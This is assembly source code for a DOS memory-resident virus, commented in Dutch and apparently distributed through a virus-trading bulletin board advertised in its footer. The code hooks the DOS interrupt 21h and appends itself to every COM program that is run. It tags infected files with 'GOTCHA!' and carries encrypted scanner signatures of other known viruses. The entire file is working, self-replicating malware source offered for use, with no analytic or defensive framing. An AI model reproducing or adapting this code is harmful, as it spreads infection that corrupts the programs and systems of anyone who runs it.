;****************************************************************************
;*              stripped COM-versie
;*              met signature's
;*
;****************************************************************************

cseg            segment
                assume  cs:cseg,ds:cseg,es:nothing

                org     100h

SIGNLEN         equ     signend - signature
FILELEN         equ     eind - begin
RESPAR          equ     (FILELEN/16) + 17
BUFLEN          equ     08h
VERSION         equ     4

                .RADIX  16


;****************************************************************************
;*              Opstart programma
;****************************************************************************

begin:          xor     bx,bx
                mov     cl,07h
crloop:         call    crypt
                loop    crloop
                call    install
                int     20


;****************************************************************************
;*              Data
;****************************************************************************

buffer          db      BUFLEN dup (?)
oi21            dw      ?,?
oldlen          dw      ?
handle          dw      ?
sign            db      0


;****************************************************************************
;*              Interupt handler 21
;****************************************************************************

ni21:           pushf

                cmp     ax,4B00h
                jne     ni_verder

                push    es
                push    ds
                push    ax
                push    bx
                push    cx
                push    dx

                call    attach

                mov     cl,[sign]
                call    crypt
                inc     cl
                and     cl,07h
                mov     [sign],cl
                call    crypt

                pop     dx
                pop     cx
                pop     bx
                pop     ax
                pop     ds
                pop     es

exit:           popf
                jmp     dword ptr cs:[oi21]     ;naar oude int-handler

ni_verder:      cmp     ax,0DADAh
                jne     exit
                mov     ax,0A500h+VERSION
                popf
                iret


;****************************************************************************
;*              plakt programma aan file (ASCIIZ  DS:DX)
;****************************************************************************

attach:         cld

                mov     ax,3D02h                ;open de file
                int     21
                jc      finnish

                push    cs
                pop     ds
                mov     [handle],ax             ;bewaar file-handle

                call    eindptr                 ;bepaal lengte
                jc      finnish
                mov     [oldlen],ax

                sub     ax,SIGNLEN              ;pointer naar eind - SIGNLEN
                sbb     dx,0
                mov     cx,dx
                mov     dx,ax
                mov     al,00h
                call    ptrmov
                jc      finnish

                mov     cx,SIGNLEN              ;lees de laatse bytes
                mov     dx,offset buffer   
                call    flread
                jc      finnish

verder3:        push    cs                      ;vergelijk signature met buffer
                pop     es
                mov     di,offset buffer
                mov     si,offset signature
                mov     cx,SIGNLEN
        rep     cmpsb
                or      cx,cx
                jz      finnish

                call    beginptr                ;lees begin van file
                mov     cx,BUFLEN
                mov     dx,offset buffer
                call    flread
                jc      finnish

                cmp     word ptr [buffer],5A4Dh
                jz      finnish

                call    writeprog               ;schrijf programma naar file
                jc      finnish

                mov     ax,[oldlen]             ;bereken call-adres
                add     ax,offset entry
                sub     ax,0103
                mov     byte ptr [buffer],0E9h
                mov     word ptr [buffer+1],ax

                call    beginptr                ;pas begin van file aan
                mov     cx,BUFLEN
                mov     dx,offset buffer
                call    flwrite
                jc      finnish

finnish:        mov     bx,[handle]             ;sluit de file
                mov     ah,3Eh
                int     21

                ret


;****************************************************************************
;*              Crypt een signature
;****************************************************************************

crypt:          push    cx
                mov     al,14h
                mul     cl
                add     ax,offset virsig
                mov     si,ax
                mov     di,ax
                push    cs
                push    cs
                pop     ds
                pop     es
                mov     cx,0Ah
cryploop:       lodsw
                xor     ax,0FFFFh
                stosw
                loop    cryploop
                pop     cx
                ret


;****************************************************************************
;*              Schrijf programma naar file
;****************************************************************************

writeprog:      call    eindptr
                mov     cx,FILELEN
                mov     dx,offset begin
                call    flwrite
                ret


;****************************************************************************
;*              Subroutines voor file-pointer
;****************************************************************************

beginptr:       mov     al,00h                  ;naar begin van de file
                xor     cx,cx
                xor     dx,dx
                jmp     ptrmov

eindptr:        mov     al,02h                  ;naar eind van de file
                xor     cx,cx
                xor     dx,dx
;               jmp     ptrmov

ptrmov:         mov     ah,42h
                mov     bx,[handle]
                int     21
                ret


;****************************************************************************
;*              Subroutines voor lezen/schrijven
;****************************************************************************

flwrite:        push    cs
                pop     ds
                mov     ah,40h
                mov     bx,[handle]
                int     21
                ret


flread:         push    cs
                pop     ds
                mov     ah,3Fh
                mov     bx,[handle]
                int     21
                ret


;****************************************************************************
;*              Activering vanuit file
;****************************************************************************

entry:          call    entry2
entry2:         pop     bx
                sub     bx,offset entry2        ;CS:BX is begin programma - 100

                cld

                mov     ax,bx                   ;copieer oude begin terug
                add     ax,offset buffer
                mov     si,ax
                mov     di,0100
                mov     cx,BUFLEN
        rep     movsb

                mov     ax,0100h
                push    ax

entcall:        mov     ax,0DADAh               ;kijk of al geinstalleerd
                int     21h
                cmp     ah,0A5h
                je      entstop

                call    install                 ;installeer het programma

entstop:        ret


;****************************************************************************
;*              Installatie in het geheugen
;****************************************************************************

install:        push    ds
                push    es

                xor     ax,ax                   ;haal oude vector
                mov     es,ax
                mov     cx,word ptr es:0084h
                mov     dx,word ptr es:0086h
                mov     [bx+offset oi21],cx
                mov     [bx+offset oi21+2],dx

                mov     ax,ds                   ;pas geheugen-grootte aan
                dec     ax
                mov     es,ax
                cmp     byte ptr es:[0000h],5Ah
                jnz     cancel
                mov     ax,es:[0003h]
                sub     ax,RESPAR
                jb      cancel
                mov     es:[0003h],ax
                sub     es:[0012h], word ptr RESPAR

                mov     es,es:[0012h]           ;copieer programma naar top
                mov     ax,bx
                add     ax,0100
                mov     si,ax
                mov     di,0100h
                mov     cx,FILELEN
        rep     movsb

                mov     dx,offset ni21          ;zet nieuwe vector
                push    es
                pop     ds
                mov     ax,2521h
                int     21h

cancel:         pop     es
                pop     ds

                ret


;****************************************************************************
;*              Tekst en Signature
;****************************************************************************

virsig:
;SYSLOCK Virus
                db      0D1h, 0E9h,  8Ah, 0E1h
                db       8Ah, 0C1h,  33h,  06h
                db       14h,  00h,  31h,  04h
                db       46h,  46h, 0E2h, 0F2h
                db       5Eh,  59h,  58h, 0C3h
;Sylvia Virus
                db       8Dh,  36h,  03h,  01h
                db       33h, 0C9h,  33h, 0C0h
                db      0ACh,  3Ch,  1Ah,  74h
                db       04h,  90h,  90h,  90h
                db       90h,  90h,  90h,  90h
;DATACRIME IIb Virus
                db       2Eh,  8Ah,  07h,  32h
                db      0C2h, 0D0h, 0CAh,  2Eh
                db       88h,  07h,  43h, 0E2h
                db      0F3h,  90h,  90h,  90h
                db       90h,  90h,  90h,  90h
;Yankee-Go-Home Virus  (Enigma)
                db      0D8h,  0Eh,  1Fh, 0BEh
                db       37h,  08h,  81h, 0EEh
                db       03h,  01h,  03h, 0F3h
                db       89h,  04h, 0BEh,  39h
                db       08h,  81h, 0EEh,  03h
;Slowdown Virus
                db      0DEh,  90h,  90h,  81h
                db      0C6h,  1Bh,  00h, 0B9h
                db       90h,  06h,  2Eh,  80h
                db       34h,  90h,  90h,  90h
                db       90h,  90h,  90h,  90h
;Scotts Valley Virus
                db       5Eh,  8Bh, 0DEh,  90h
                db       90h,  81h, 0C6h,  32h
                db       00h, 0B9h,  12h,  08h
                db       2Eh,  90h,  90h,  90h
                db       90h,  90h,  90h,  90h
;Tiny-2A related Virus
                db      0A5h,  8Eh, 0C1h, 0A6h
                db       74h,  12h,  4Eh,  4Fh
                db      0F3h, 0A5h,  8Eh, 0C1h
                db       93h,  91h,  91h,  26h
                db       87h,  85h, 0E0h, 0FEh
;DATACRIME 1280 Virus
                db       8Bh,  36h,  01h,  01h
                db       83h, 0EEh,  03h,  8Bh
                db      0C6h,  3Dh,  00h,  00h
                db       75h,  03h, 0E9h,  02h
                db       01h,  90h,  90h,  90h


;;July13 Virus
;                db      0A0h,  12h,  00h,  34h
;                db       90h, 0BEh,  12h,  00h
;                db      0B9h, 0B1h,  04h,  2Eh
;                db       30h,  04h,  46h, 0E2h
;                db      0FAh,  90h,  90h,  90h
;;XA1 Virus (Tannenbaum)
;virsig:         db      0FAh,  8Bh, 0ECh,  58h
;                db       32h, 0C0h,  89h,  46h
;                db       02h,  81h,  46h,  00h
;                db       28h,  00h,  90h,  90h
;                db       90h,  90h,  90h,  90h
;;Twelve Tricks Trojan Dropper
;                db      0BEh,  64h,  02h,  31h
;                db       94h,  42h,  01h, 0D1h
;                db      0C2h,  4Eh,  79h, 0F7h
;                db       90h,  90h,  90h,  90h
;                db       90h,  90h,  90h,  90h



signature:      db      'GOTCHA!',0
signend:

eind:

cseg            ends
                end     begin




; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
; 컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
; 컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

